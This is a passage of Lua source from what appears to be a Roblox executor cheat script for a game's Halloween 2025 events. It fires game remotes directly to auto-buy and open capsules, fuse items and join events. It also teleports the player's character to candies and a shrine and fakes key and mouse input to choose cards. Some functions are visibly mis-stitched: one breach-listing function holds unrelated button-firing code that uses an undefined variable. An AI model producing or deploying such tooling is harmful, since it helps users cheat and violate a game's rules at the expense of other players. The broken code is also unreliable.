                                    warn("[Webhook Seamless] Error sending seamless webhook: " .. tostring(err))
                                end
                                getgenv()._WebhookSeamlessRestart = false
                                if getgenv()._RefreshWebhookInitialData then
                                    pcall(getgenv()._RefreshWebhookInitialData)
                                end
                            end)
                        end
                    end
                end
                lastWave = currentWave
            end)
        end
    end)

    -- Event 1 auto-join removed - see Event1_Event2_Backup.lua
    -- Event auto-bingo removed - see Event1_Event2_Backup.lua
    -- Event auto-capsule 1 removed - see Event1_Event2_Backup.lua
    -- Event auto-join 2 removed - see Event1_Event2_Backup.lua
    -- Event auto-candy removed - see Event1_Event2_Backup.lua
    -- Event auto-capsule 2 removed - see Event1_Event2_Backup.lua
    -- Event auto-buy-capsule 2 removed - see Event1_Event2_Backup.lua
    -- Event auto-fuse removed - see Event1_Event2_Backup.lua
end

do
    if isInLobby then
        task.spawn(function()
        
        local function getAvailableBreaches()
            local events = {"Activated", "MouseButton1Click", "MouseButton1Down", "MouseButton1Up"}
            for _, ev in ipairs(events) do
                pcall(function()
                    for _, conn in ipairs(getconnections(button[ev])) do
                        conn:Fire()
                    end
                end)
            end
            getgenv()._SkipRecordingNextCall = false
            return true
        end
        
        local function clickAllPromptButtons()
            local success = false
            pcall(function()
                local prompt = LocalPlayer.PlayerGui:FindFirstChild("Prompt")
                if not prompt then return end
                
                local frame = prompt:FindFirstChild("Frame")
                if not frame then return end
                
                local textButton = frame:FindFirstChild("TextButton")
                if textButton then
                    clickButton(textButton)
                    success = true
                end
                
                local folder = frame:FindFirstChild("Folder")
                if folder then
                    local folderButton = folder:FindFirstChild("TextButton")
                    if folderButton then
                        clickButton(folderButton)
                        success = true
                    end
                end
            end)
            return success
        end
        
        while true do
            task.wait(0.1) 
            
            if not getgenv().CapsuleEnabled then
                task.wait(3)
                continue
            end
            
            if getgenv().CapsuleEnabled then
                local clientData = getClientData()
                if clientData then
                    local candyBasket = clientData.CandyBasket or 0
                    
                    local eventsFolder = RS:FindFirstChild("Events")
                    local halloweenFolder = eventsFolder and eventsFolder:FindFirstChild("Hallowen2025")
                    local purchaseEvent = halloweenFolder and halloweenFolder:FindFirstChild("Purchase")
                    
                    if purchaseEvent then
                        if candyBasket >= 1000000 then
                            pcall(function() 
                                purchaseEvent:InvokeServer(2, 1000, "Hallowen2025")
                                print("[Auto Capsule 1] Purchased 1000 capsules")
                            end)
                        elseif candyBasket >= 100000 then
                            pcall(function() 
                                purchaseEvent:InvokeServer(2, 100, "Hallowen2025")
                                print("[Auto Capsule 1] Purchased 100 capsules")
                            end)
                        elseif candyBasket >= 10000 then
                            pcall(function() 
                                purchaseEvent:InvokeServer(2, 10, "Hallowen2025")
                                print("[Auto Capsule 1] Purchased 10 capsules")
                            end)
                        elseif candyBasket >= 1000 then
                            pcall(function() 
                                purchaseEvent:InvokeServer(2, 1, "Hallowen2025")
                                print("[Auto Capsule 1] Purchased 1 capsule")
                            end)
                        end
                    end
                    
                    if candyBasket < 1000 then
                        ClientDataCache.module = nil
                        ClientDataCache.lastUpdate = 0
                        clientData = getClientData()
                        local capsuleAmount = 0
                        if clientData and clientData.ItemData and clientData.ItemData.HalloweenCapsule2025 then
                            capsuleAmount = clientData.ItemData.HalloweenCapsule2025.Amount or 0
                        end
                        
                        if capsuleAmount > 0 then
                            local beforeData = {}
                            if clientData.UnitData then
                                beforeData.UnitData = {}
                                for k, v in pairs(clientData.UnitData) do
                                    beforeData.UnitData[k] = v
                                end
                            end
                            if clientData.ItemData then
                                beforeData.ItemData = {}
                                for k, v in pairs(clientData.ItemData) do
                                    beforeData.ItemData[k] = {Amount = v.Amount or 0}
                                end
                            end
                            
                            local openCapsuleRemote = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("OpenCapsule")
                            if openCapsuleRemote then
                                pcall(function()
                                    openCapsuleRemote:FireServer("HalloweenCapsule2025", capsuleAmount)
                                    print("[Auto Capsule Event 1] Opened " .. capsuleAmount .. " capsules")
                                end)
                                task.wait(0.5)
                                clickAllPromptButtons()
                                
                                local waitTime = math.min(3 + (capsuleAmount / 10000), 10)
                                task.wait(waitTime)
                                
                                local afterData = nil
                                local attempts = 0
                                local maxAttempts = 5
                                
                                while attempts < maxAttempts do
                                    ClientDataCache.module = nil
                                    ClientDataCache.lastUpdate = 0
                                    afterData = getClientData()
                                    
                                    if afterData and afterData.ItemData then
                                        local currentCapsules = (afterData.ItemData.HalloweenCapsule2025 and afterData.ItemData.HalloweenCapsule2025.Amount) or 0
                                        local beforeCapsules = (beforeData.ItemData and beforeData.ItemData.HalloweenCapsule2025 and beforeData.ItemData.HalloweenCapsule2025.Amount) or 0
                                        
                                        if currentCapsules ~= beforeCapsules or attempts >= 3 then
                                            break
                                        end
                                    end
                                    
                                    attempts = attempts + 1
                                    task.wait(1)
                                end
                                
                                if afterData and getgenv()._CompareCapsuleRewards then
                                    local rewardsText = getgenv()._CompareCapsuleRewards(beforeData, afterData)
                                    print("[Auto Capsule Event 1] Rewards:\n" .. rewardsText)
                                    
                                    if getgenv()._SendCapsuleWebhook then
                                        getgenv()._SendCapsuleWebhook("Halloween Event 1 Capsules", capsuleAmount, rewardsText, afterData)
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end)
    end
end

task.spawn(function()
    task.wait(0.1)
    
    while true do
        task.wait(0.1)
        
        if not getgenv().AutoBuyCapsuleEnabled then
            task.wait(3)
            continue
        end
        
        pcall(function()
            local clientData = getClientData()
            if not clientData then return end
            
            local candyBasket = clientData.CandyBasket or 0
            
            local eventsFolder = RS:FindFirstChild("Events")
            local halloweenFolder = eventsFolder and eventsFolder:FindFirstChild("Hallowen2025")
            local purchaseEvent = halloweenFolder and halloweenFolder:FindFirstChild("Purchase")
            
            if purchaseEvent then
                if candyBasket >= 1000000 then
                    pcall(function() 
                        purchaseEvent:InvokeServer(2, 1000, "Hallowen2025")
                        print("[Auto Buy Capsule 1] Purchased 1000 capsules")
                    end)
                elseif candyBasket >= 100000 then
                    pcall(function() 
                        purchaseEvent:InvokeServer(2, 100, "Hallowen2025")
                        print("[Auto Buy Capsule 1] Purchased 100 capsules")
                    end)
                elseif candyBasket >= 10000 then
                    pcall(function() 
                        purchaseEvent:InvokeServer(2, 10, "Hallowen2025")
                        print("[Auto Buy Capsule 1] Purchased 10 capsules")
                    end)
                elseif candyBasket >= 1000 then
                    pcall(function() 
                        purchaseEvent:InvokeServer(2, 1, "Hallowen2025")
                        print("[Auto Buy Capsule 1] Purchased 1 capsule")
                    end)
                end
            end
        end)
    end
end)

task.spawn(function()
    while true do
        task.wait(2)
        
        if not getgenv().AutoEvent2Enabled then
            task.wait(2)
            continue
        end
        
        pcall(function()
            local eventsFolder = RS:FindFirstChild("Events")
            local halloweenFolder = eventsFolder and eventsFolder:FindFirstChild("Hallowen2025")
            local enterEvent = halloweenFolder and halloweenFolder:FindFirstChild("Enter")
            local startEvent = halloweenFolder and halloweenFolder:FindFirstChild("Start")
            
            if enterEvent and startEvent then
                enterEvent:FireServer("Hallowen2025_P2")
                
                task.wait(0.5)
                
                if getgenv().WaitForPlayerEnabled then
                    local entryUI = nil
                    for _, gui in ipairs(LocalPlayer.PlayerGui:GetChildren()) do
                        if gui.Name:find("Entry") and gui.Enabled then
                            entryUI = gui
                            break
                        end
                    end
                    
                    if entryUI then
                        local function findTextLabel(parent)
                            for _, child in ipairs(parent:GetDescendants()) do
                                if child:IsA("TextLabel") and child.Text:find("Players") then
                                    return child
                                end
                            end
                            return nil
                        end
                        
                        local textLabel = findTextLabel(entryUI)
                        if textLabel then
                            local waitStartTime = tick()
                            local maxWaitTime = 300
                            
                            while tick() - waitStartTime < maxWaitTime do
                                local text = textLabel.Text
                                local current, max = text:match("%((%d+)/(%d+)%)")
                                
                                if current and max then
                                    local currentPlayers = tonumber(current)
                                    local targetCount = getgenv().WaitForPlayerCount or 1
                                    
                                    if currentPlayers >= targetCount then
                                        print("[Auto Event2] ✅ " .. currentPlayers .. "/" .. targetCount .. " players ready, starting...")
                                        break
                                    else
                                        print("[Auto Event2] ⏳ Waiting for players... " .. currentPlayers .. "/" .. targetCount)
                                    end
                                end
                                
                                task.wait(1)
                            end
                        end
                    end
                end
                
                startEvent:FireServer()
                
                task.wait(5)
            end
        end)
    end
end)

task.spawn(function()
    while true do
        task.wait(0.5)
        
        if not getgenv().AutoCandyEnabled then
            task.wait(2)
            continue
        end
        
        pcall(function()
            local collectibles = workspace:FindFirstChild("Collectibles")
            if not collectibles then return end
            
            local character = LocalPlayer.Character
            if not character or not character:FindFirstChild("HumanoidRootPart") then return end
            
            local hrp = character.HumanoidRootPart
            
            for _, candy in pairs(collectibles:GetChildren()) do
                if candy.Name == "Candy" and candy:IsA("BasePart") then
                    hrp.CFrame = candy.CFrame
                    task.wait(0.1)
                end
            end
        end)
    end
end)

if not isInLobby then
    task.spawn(function()
        task.wait(1)
        
        local Purchase, OpenCapsule
        pcall(function()
            Purchase = RS:WaitForChild("Events"):WaitForChild("Hallowen2025"):WaitForChild("Purchase")
            OpenCapsule = RS:WaitForChild("Remotes"):WaitForChild("OpenCapsule")
        end)
        
        if not Purchase or not OpenCapsule then
            warn("[Event 2] Capsule remotes not found")
            return
        end
    
    local function clickButton(button)
        if not button then return false end
        getgenv()._SkipRecordingNextCall = true
        local events = {"Activated", "MouseButton1Click", "MouseButton1Down", "MouseButton1Up"}
        for _, ev in ipairs(events) do
            pcall(function()
                for _, conn in ipairs(getconnections(button[ev])) do
                    conn:Fire()
                end
            end)
        end
        getgenv()._SkipRecordingNextCall = false
        return true
    end
    
    local function clickAllPromptButtons()
        local success = false
        pcall(function()
            local prompt = LocalPlayer.PlayerGui:FindFirstChild("Prompt")
            if not prompt then return end
            
            local frame = prompt:FindFirstChild("Frame")
            if not frame then return end
            
            local textButton = frame:FindFirstChild("TextButton")
            if textButton then
                clickButton(textButton)
                success = true
            end
            
            local folder = frame:FindFirstChild("Folder")
            if folder then
                local folderButton = folder:FindFirstChild("TextButton")
                if folderButton then
                    clickButton(folderButton)
                    success = true
                end
            end
        end)
        return success
    end
    
    while true do
        task.wait(0.1)
        
        if not getgenv().Capsule2Enabled then
            task.wait(3)
            continue
        end
        
        pcall(function()
            local clientData = getClientData()
            if not clientData then return end
            
            local halloweenCookies = clientData.HalloweenCookies or 0
            
            if halloweenCookies >= 750000 then
                Purchase:InvokeServer(2, 1000, "Hallowen2025_P2")
            elseif halloweenCookies >= 75000 then
                Purchase:InvokeServer(2, 100, "Hallowen2025_P2")
            elseif halloweenCookies >= 7500 then
                Purchase:InvokeServer(2, 10, "Hallowen2025_P2")
            elseif halloweenCookies >= 750 then
                Purchase:InvokeServer(2, 1, "Hallowen2025_P2")
            end
            
            if halloweenCookies < 1000 then
                ClientDataCache.module = nil
                ClientDataCache.lastUpdate = 0
                clientData = getClientData()
                local capsuleAmount = 0
                if clientData and clientData.ItemData and clientData.ItemData.HalloweenCapsule2025_P2 then
                    capsuleAmount = clientData.ItemData.HalloweenCapsule2025_P2.Amount or 0
                end
                
                if capsuleAmount > 0 then
                    local beforeData = {}
                    if clientData.UnitData then
                        beforeData.UnitData = {}
                        for k, v in pairs(clientData.UnitData) do
                            beforeData.UnitData[k] = v
                        end
                    end
                    if clientData.ItemData then
                        beforeData.ItemData = {}
                        for k, v in pairs(clientData.ItemData) do
                            beforeData.ItemData[k] = {Amount = v.Amount or 0}
                        end
                    end
                    
                    OpenCapsule:FireServer("HalloweenCapsule2025_P2", capsuleAmount)
                    print("[Auto Capsule Event 2] Opened " .. capsuleAmount .. " capsules")
                    task.wait(0.5)
                    clickAllPromptButtons()
                    
                    local waitTime = math.min(3 + (capsuleAmount / 10000), 10)
                    task.wait(waitTime)
                    
                    local afterData = nil
                    local attempts = 0
                    local maxAttempts = 5
                    
                    while attempts < maxAttempts do
                        ClientDataCache.module = nil
                        ClientDataCache.lastUpdate = 0
                        afterData = getClientData()
                        
                        if afterData and afterData.ItemData then
                            local currentCapsules = (afterData.ItemData.HalloweenCapsule2025_P2 and afterData.ItemData.HalloweenCapsule2025_P2.Amount) or 0
                            local beforeCapsules = (beforeData.ItemData and beforeData.ItemData.HalloweenCapsule2025_P2 and beforeData.ItemData.HalloweenCapsule2025_P2.Amount) or 0
                            
                            if currentCapsules ~= beforeCapsules or attempts >= 3 then
                                break
                            end
                        end
                        
                        attempts = attempts + 1
                        task.wait(1)
                    end
                    
                    if afterData and getgenv()._CompareCapsuleRewards then
                        local rewardsText = getgenv()._CompareCapsuleRewards(beforeData, afterData)
                        print("[Auto Capsule Event 2] Rewards:\n" .. rewardsText)
                        
                        if getgenv()._SendCapsuleWebhook then
                            getgenv()._SendCapsuleWebhook("Halloween Event 2 Capsules", capsuleAmount, rewardsText, afterData)
                        end
                    end
                end
            end
        end)
    end
    end)
end

task.spawn(function()
    task.wait(1)
    local Purchase = RS:WaitForChild("Events"):WaitForChild("Hallowen2025"):WaitForChild("Purchase")
    
    while true do
        task.wait(0.1)
        
        if not getgenv().AutoBuyCapsule2Enabled then
            task.wait(0.5)
            continue
        end
        
        pcall(function()
            local clientData = getClientData()
            if not clientData then return end
            
            local halloweenCookies = clientData.HalloweenCookies or 0
            
            if halloweenCookies >= 750000 then
                Purchase:InvokeServer(2, 1000, "Hallowen2025_P2")
                print("[Auto Buy Capsule 2] Purchased 1000 capsules")
            elseif halloweenCookies >= 75000 then
                Purchase:InvokeServer(2, 100, "Hallowen2025_P2")
                print("[Auto Buy Capsule 2] Purchased 100 capsules")
            elseif halloweenCookies >= 7500 then
                Purchase:InvokeServer(2, 10, "Hallowen2025_P2")
                print("[Auto Buy Capsule 2] Purchased 10 capsules")
            elseif halloweenCookies >= 750 then
                Purchase:InvokeServer(2, 1, "Hallowen2025_P2")
                print("[Auto Buy Capsule 2] Purchased 1 capsule")
            end
        end)
    end
end)

task.spawn(function()
    task.wait(1)
    local fuseRemote = RS:WaitForChild("Remotes"):WaitForChild("HalloweenEventFuseItem")
    local openRemote = RS:WaitForChild("Remotes"):WaitForChild("OpenCapsule")
    
    local function clickButton(button)
        if not button then return false end
        getgenv()._SkipRecordingNextCall = true
        local events = {"Activated", "MouseButton1Click", "MouseButton1Down", "MouseButton1Up"}
        for _, ev in ipairs(events) do
            pcall(function()
                if button[ev] then button[ev]:Fire() end
            end)
        end
        getgenv()._SkipRecordingNextCall = false
        return true
    end
    
    local function clickAllPromptButtons()
        local success = false
        pcall(function()
            local prompt = LocalPlayer.PlayerGui:FindFirstChild("Prompt")
            if not prompt then return end
            local frame = prompt:FindFirstChild("Frame")
            if not frame then return end
            local textButton = frame:FindFirstChild("TextButton")
            if textButton then
                clickButton(textButton)
                success = true
            end
            
            local folder = frame:FindFirstChild("Folder")
            if folder then
                local folderButton = folder:FindFirstChild("TextButton")
                if folderButton then
                    clickButton(folderButton)
                    success = true
                end
            end
        end)
        return success
    end
    
    while true do
        task.wait(0.1)
        
        pcall(function()
            local clientData = getClientData()
            if not clientData or not clientData.ItemData then return end
            
            if getgenv().AutoFuseRainbowCandyEnabled then
                local rainbowCandyAmount = (clientData.ItemData.RainbowCandyDust and clientData.ItemData.RainbowCandyDust.Amount) or 0
                if rainbowCandyAmount >= 5 then
                    fuseRemote:FireServer("RainbowCandyDust")
                end
            end
            
            if getgenv().AutoFuseCandyBagEnabled then
                local candyBagAmount = (clientData.ItemData.TreatCandyBag and clientData.ItemData.TreatCandyBag.Amount) or 0
                if candyBagAmount >= 15 then
                    fuseRemote:FireServer("TreatCandyBag")
                end
            end
            
            if getgenv().AutoFuseBigCandyBagEnabled then
                local bigCandyBagAmount = (clientData.ItemData.BigTreatCandyBag and clientData.ItemData.BigTreatCandyBag.Amount) or 0
                if bigCandyBagAmount >= 1 then
                    fuseRemote:FireServer("BigTreatCandyBag")
                end
            end
            
            if getgenv().AutoOpenCandyBagEnabled then
                ClientDataCache.module = nil
                ClientDataCache.lastUpdate = 0
                clientData = getClientData()
                local candyBagAmount = (clientData.ItemData and clientData.ItemData.TreatCandyBag and clientData.ItemData.TreatCandyBag.Amount) or 0
                
                if candyBagAmount >= 1 then
                    local beforeData = {}
                    if clientData.UnitData then
                        beforeData.UnitData = {}
                        for k, v in pairs(clientData.UnitData) do
                            beforeData.UnitData[k] = v
                        end
                    end
                    if clientData.ItemData then
                        beforeData.ItemData = {}
                        for k, v in pairs(clientData.ItemData) do
                            beforeData.ItemData[k] = {Amount = v.Amount or 0}
                        end
                    end
                    
                    openRemote:FireServer("TreatCandyBag", candyBagAmount)
                    print("[Auto Open Candy Bag] Opened " .. candyBagAmount .. " bags")
                    task.wait(0.5)
                    clickAllPromptButtons()
                    
                    local waitTime = math.min(3 + (candyBagAmount / 10000), 10)
                    task.wait(waitTime)
                    
                    local afterData = nil
                    local attempts = 0
                    local maxAttempts = 5
                    
                    while attempts < maxAttempts do
                        ClientDataCache.module = nil
                        ClientDataCache.lastUpdate = 0
                        afterData = getClientData()
                        
                        if afterData and afterData.ItemData then
                            local currentBags = (afterData.ItemData.TreatCandyBag and afterData.ItemData.TreatCandyBag.Amount) or 0
                            local beforeBags = (beforeData.ItemData and beforeData.ItemData.TreatCandyBag and beforeData.ItemData.TreatCandyBag.Amount) or 0
                            
                            if currentBags ~= beforeBags or attempts >= 3 then
                                break
                            end
                        end
                        
                        attempts = attempts + 1
                        task.wait(1)
                    end
                    
                    if afterData and getgenv()._CompareCapsuleRewards then
                        local rewardsText = getgenv()._CompareCapsuleRewards(beforeData, afterData)
                        print("[Auto Open Candy Bag] Rewards:\n" .. rewardsText)
                        
                        if getgenv()._SendCapsuleWebhook then
                            getgenv()._SendCapsuleWebhook("Event 3 Candy Bags", candyBagAmount, rewardsText, afterData)
                        end
                    end
                end
            end
            
            if getgenv().AutoOpenBigCandyBagEnabled then
                ClientDataCache.module = nil
                ClientDataCache.lastUpdate = 0
                clientData = getClientData()
                local bigCandyBagAmount = (clientData.ItemData and clientData.ItemData.BigTreatCandyBag and clientData.ItemData.BigTreatCandyBag.Amount) or 0
                
                if bigCandyBagAmount >= 1 then
                    local beforeData = {}
                    if clientData.UnitData then
                        beforeData.UnitData = {}
                        for k, v in pairs(clientData.UnitData) do
                            beforeData.UnitData[k] = v
                        end
                    end
                    if clientData.ItemData then
                        beforeData.ItemData = {}
                        for k, v in pairs(clientData.ItemData) do
                            beforeData.ItemData[k] = {Amount = v.Amount or 0}
                        end
                    end
                    
                    openRemote:FireServer("BigTreatCandyBag", bigCandyBagAmount)
                    print("[Auto Open Big Candy Bag] Opened " .. bigCandyBagAmount .. " bags")
                    task.wait(0.5)
                    clickAllPromptButtons()
                    
                    local waitTime = math.min(3 + (bigCandyBagAmount / 10000), 10)
                    task.wait(waitTime)
                    
                    local afterData = nil
                    local attempts = 0
                    local maxAttempts = 5
                    
                    while attempts < maxAttempts do
                        ClientDataCache.module = nil
                        ClientDataCache.lastUpdate = 0
                        afterData = getClientData()
                        
                        if afterData and afterData.ItemData then
                            local currentBags = (afterData.ItemData.BigTreatCandyBag and afterData.ItemData.BigTreatCandyBag.Amount) or 0
                            local beforeBags = (beforeData.ItemData and beforeData.ItemData.BigTreatCandyBag and beforeData.ItemData.BigTreatCandyBag.Amount) or 0
                            
                            if currentBags ~= beforeBags or attempts >= 3 then
                                break
                            end
                        end
                        
                        attempts = attempts + 1
                        task.wait(1)
                    end
                    
                    if afterData and getgenv()._CompareCapsuleRewards then
                        local rewardsText = getgenv()._CompareCapsuleRewards(beforeData, afterData)
                        print("[Auto Open Big Candy Bag] Rewards:\n" .. rewardsText)
                        
                        if getgenv()._SendCapsuleWebhook then
                            getgenv()._SendCapsuleWebhook("Event 3 Big Candy Bags", bigCandyBagAmount, rewardsText, afterData)
                        end
                    end
                end
            end
        end)
    end
end)

do
    if isInLobby then
        task.spawn(function()
        
        local function getAvailableBreaches()
            local ok, breaches = pcall(function()
                local lobby = workspace:FindFirstChild("Lobby")
                if not lobby then return {} end
                local breachesFolder = lobby:FindFirstChild("Breaches")
                if not breachesFolder then return {} end
                local available = {}
                local children = breachesFolder:GetChildren()
                for i = 1, #children do
                    local part = children[i]
                    local breachPart = part:FindFirstChild("Breach")
                    if breachPart then
                        local proximityPrompt = breachPart:FindFirstChild("ProximityPrompt")
                        if proximityPrompt and proximityPrompt:IsA("ProximityPrompt") then
                            if proximityPrompt.ObjectText and proximityPrompt.ObjectText ~= "" then
                                local breachName = proximityPrompt.ObjectText
                                available[#available + 1] = { name = breachName, instance = part }
                            end
                        end
                    end
                end
                return available
            end)
            if not ok then return {} end
            return breaches or {}
        end
        
        while true do
            task.wait(1)
            if getgenv().BreachEnabled then
                local availableBreaches = getAvailableBreaches()
                for _, breach in ipairs(availableBreaches) do
                    local shouldJoin = getgenv().BreachAutoJoin[breach.name]
                    if shouldJoin then
                        pcall(function()
                            local remote = RS.Remotes.Breach.EnterEvent
                            remote:FireServer(breach.instance)
                        end)
                        task.wait(0.5)
                    end
                end
            end
        end
        end)
    end
end



do
    task.spawn(function()
        
        local VIM = game:GetService("VirtualInputManager")
        local TweenService = game:GetService("TweenService")
    
    local function teleportToShrine()
        local ok, err = pcall(function()
            local shrine = workspace:FindFirstChild("Map") and workspace.Map:FindFirstChild("Shrine")
            if not shrine then return false end
            
            local model = shrine:FindFirstChild("Model")
            if not model then return false end
            
            local proximityPrompt = model:FindFirstChild("ProximityPrompt")
            if not proximityPrompt then return false end
            
            local character = LocalPlayer.Character
            if not character then return false end
            
            local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
            if not humanoidRootPart then return false end
            
            local shrinePosition = model:GetPivot().Position
            humanoidRootPart.CFrame = CFrame.new(shrinePosition + Vector3.new(0, 3, 0))
            
            task.wait(0.3)
            
            VIM:SendKeyEvent(true, Enum.KeyCode.E, false, game)
            task.wait(0.05)
            VIM:SendKeyEvent(false, Enum.KeyCode.E, false, game)
            
            return true
        end)
        
        return ok
    end
    
    local lastAttempt = 0
    
    while true do
        task.wait(1)
        
        if getgenv().AutoUnleashSukunaEnabled then
            local now = tick()
            
            if (now - lastAttempt) >= 5 then
                lastAttempt = now
                
                pcall(function()
                    local shrine = workspace:FindFirstChild("Map") and workspace.Map:FindFirstChild("Shrine")
                    if shrine then
                        local model = shrine:FindFirstChild("Model")
                        if model then
                            local proximityPrompt = model:FindFirstChild("ProximityPrompt")
                            if proximityPrompt then
                                teleportToShrine()
                            end
                        end
                    end
                end)
            end
        end
    end
    end)
end



do
    task.spawn(function()
        local VIM = game:GetService("VirtualInputManager")
    
    local function getAvailableCards()
        local ok, result = pcall(function()
            local playerGui = LocalPlayer.PlayerGui
            local prompt = playerGui:FindFirstChild("Prompt")
            if not prompt then return nil end
            local frame = prompt:FindFirstChild("Frame")
            if not frame or not frame:FindFirstChild("Frame") then return nil end
            
            local frameChildren = frame:FindFirstChild("Frame"):GetChildren()
            if #frameChildren < 4 then return nil end
            
            local fourthFrame = frameChildren[4]
            local cardButtons = fourthFrame:GetChildren()
            
            local cards = {}
            for i = 1, math.min(4, #cardButtons) do
                local cardButton = cardButtons[i]
                if cardButton and cardButton:IsA("TextButton") then
                    local frameChild = cardButton:FindFirstChild("Frame")
                    if frameChild then
                        local textLabel = frameChild:FindFirstChild("TextLabel")
                        if textLabel and textLabel.Text and textLabel.Text ~= "" then
                            local cardName = textLabel.Text
                            table.insert(cards, { name = cardName, button = cardButton })
                        end
                    end
                end
            end
            
            return #cards > 0 and cards or nil
        end)
        
        return ok and result or nil
    end
    
    local function findBestCard(list)
        local bestIndex, bestPriority = nil, math.huge
        
        local blacklistedCards = {
            ["Devil's Sacrifice"] = true,
            ["Sacrifice"] = true,
        }
        
        local isBossRush = false
        local isSlimeRush = false
        
        pcall(function()
            local gamemode = RS:FindFirstChild("Gamemode")
            if gamemode then
                if gamemode.Value == "BossRush" then
                    isBossRush = true
                elseif gamemode.Value == "SlimeRush" then
                    isSlimeRush = true
                end
            end
        end)
        
        local priorityTable
        if isBossRush then
            priorityTable = getgenv().BossRushCardPriority
        elseif isSlimeRush then
            priorityTable = getgenv().SlimeRushCardPriority
        else
            priorityTable = getgenv().CardPriority
        end
        
        for i=1,#list do
            local nm = list[i].name
            
            if not blacklistedCards[nm] then
                local p = (priorityTable and priorityTable[nm]) or 999
                if p < bestPriority and p < 999 then
                    bestPriority = p
                    bestIndex = i
                end
            end
        end
        if bestIndex then
            return bestIndex, list[bestIndex], bestPriority
        end
        return nil, nil, nil
    end
    
    local function pressConfirm()
        local confirmButton = nil
        
        pcall(function()
            local prompt = LocalPlayer.PlayerGui:FindFirstChild("Prompt")
            if not prompt then return end
            local frame = prompt:FindFirstChild("Frame")
            if not frame then return end
            local inner = frame:FindFirstChild("Frame")
            if not inner then return end
            local children = inner:GetChildren()
            if #children < 5 then return end
            local button = children[5]:FindFirstChild("TextButton")
            if not button then return end
            local label = button:FindFirstChild("TextLabel")
            if label and label.Text == "Confirm" then 
                confirmButton = button 
            end
        end)
        
        if not confirmButton then
            return false
        end
        
        local anySuccess = false
        
        pcall(function()
            local GuiService = game:GetService("GuiService")
            pcall(function()
                GuiService.SelectedObject = nil
            end)
            task.wait(0.05)
            
            if confirmButton and confirmButton:IsDescendantOf(LocalPlayer.PlayerGui) then
                pcall(function()
                    GuiService.SelectedObject = confirmButton
                end)
            else
                return
            end
            
            local lockConnection
            lockConnection = RunService.Heartbeat:Connect(function()
                pcall(function()
                    if confirmButton and confirmButton.Parent and confirmButton:IsDescendantOf(LocalPlayer.PlayerGui) and GuiService.SelectedObject ~= confirmButton then
                        GuiService.SelectedObject = confirmButton
                    end
                end)
            end)
            
            task.wait(0.25)
            
            if GuiService.SelectedObject == confirmButton then
                VIM:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
                task.wait(0.05)
                VIM:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
                anySuccess = true
            end
            
            if lockConnection then
                lockConnection:Disconnect()
            end
            
            GuiService.SelectedObject = nil
        end)
        
        task.wait(0.1)
        
        pcall(function()
            if getconnections then
                local events = {"Activated", "MouseButton1Click", "MouseButton1Down", "MouseButton1Up"}
                for _, ev in ipairs(events) do
                    pcall(function()
                        local connections = getconnections(confirmButton[ev])
                        if connections then
                            for _, conn in ipairs(connections) do
                                if conn and conn.Fire then
                                    conn:Fire()
                                    anySuccess = true
                                end
                            end
                        end
                    end)
                end
            end
        end)
        
        task.wait(0.1)
        
        pcall(function()
            local VirtualInputManager = game:GetService("VirtualInputManager")
            local absPos = confirmButton.AbsolutePosition
            local absSize = confirmButton.AbsoluteSize
            if absPos and absSize then
                local centerX = absPos.X + (absSize.X / 2)
                local centerY = absPos.Y + (absSize.Y / 2)
                
                VirtualInputManager:SendMouseMoveEvent(centerX, centerY, game)
                task.wait(0.1)
                VirtualInputManager:SendMouseButtonEvent(centerX, centerY, 0, true, game, 0)
                task.wait(0.05)
                VirtualInputManager:SendMouseButtonEvent(centerX, centerY, 0, false, game, 0)
                anySuccess = true
            end
        end)
        
        return anySuccess
    end
    
    local function selectCard()
        local isBossRush = false
        local isSlimeRush = false
        
        pcall(function()
            local gamemode = RS:FindFirstChild("Gamemode")
            if gamemode then
                if gamemode.Value == "BossRush" then
                    isBossRush = true
                elseif gamemode.Value == "SlimeRush" then
                    isSlimeRush = true
                end
            end
        end)
        
        if isBossRush then
            if not getgenv().BossRushEnabled then return false end
        elseif isSlimeRush then
            if not getgenv().SlimeRushCardSelectionEnabled then return false end
        else
            if not getgenv().CardSelectionEnabled then return false end
        end
        
        local ok = pcall(function()
            local list = getAvailableCards()
            if not list then return false end
            
            local _, best, priority = findBestCard(list)
            if not best or not best.button or not priority then return false end
            if priority >= 999 then return false end
            
            local button = best.button
            local GuiService = game:GetService("GuiService")
            
            if not button:IsDescendantOf(LocalPlayer.PlayerGui) then
                return false
            end
            
            pcall(function()
                GuiService.SelectedObject = nil
            end)
            task.wait(0.2)
            
            if button and button:IsDescendantOf(LocalPlayer.PlayerGui) then
                pcall(function()
                    GuiService.SelectedObject = button
                end)
            else
                return false
            end
            
            local lockConnection
            lockConnection = RunService.Heartbeat:Connect(function()
                pcall(function()
                    if button and button.Parent and button:IsDescendantOf(LocalPlayer.PlayerGui) and GuiService.SelectedObject ~= button then
                        GuiService.SelectedObject = button
                    end
                end)
            end)
            
            task.wait(0.25)
            
            local cardSelected = false
            if GuiService.SelectedObject == button then
                VIM:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
                task.wait(0.05)
                VIM:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
                cardSelected = true
            end
            
            task.wait(0.3)
            
            if lockConnection then
                lockConnection:Disconnect()
            end
            
            GuiService.SelectedObject = nil
            
            if not cardSelected then
                return false
            end
            
            task.wait(0.4)
            
            pressConfirm()
            task.wait(0.3)
        end)
        
        return ok
    end
    
    local function selectCardSlower()
        local isSlimeRush = false
        pcall(function()
            local gamemode = RS:FindFirstChild("Gamemode")
            if gamemode and gamemode.Value == "SlimeRush" then
                isSlimeRush = true
            end
        end)
        
        if isSlimeRush then
            if not getgenv().SlimeRushSlowerCardSelectionEnabled then return false end
        else
            if not getgenv().SlowerCardSelectionEnabled then return false end
        end
        
        local ok, result = pcall(function()
            local currentSignature = getPromptSignature()
            if not currentSignature then
                return false
            end
            
            if getgenv().SlowerCardLastPromptId == currentSignature then
                return false
            end
            
            local currentWave = 0
            pcall(function()
                local wave = RS:FindFirstChild("Wave")
                if wave and wave.Value then
                    currentWave = wave.Value
                end
            end)
            
            local list = getAvailableCards()
            if not list or #list == 0 then 
                return false 
            end
            
            local bestCard = nil
            local bestValue = -999999
            
            local alreadyPicked = {}
            for _, pickedName in ipairs(getgenv().SlowerCardPicked or {}) do
                alreadyPicked[pickedName] = true
            end
            
            for i=1,#list do
                local nm = list[i].name
                
                if not alreadyPicked[nm] then
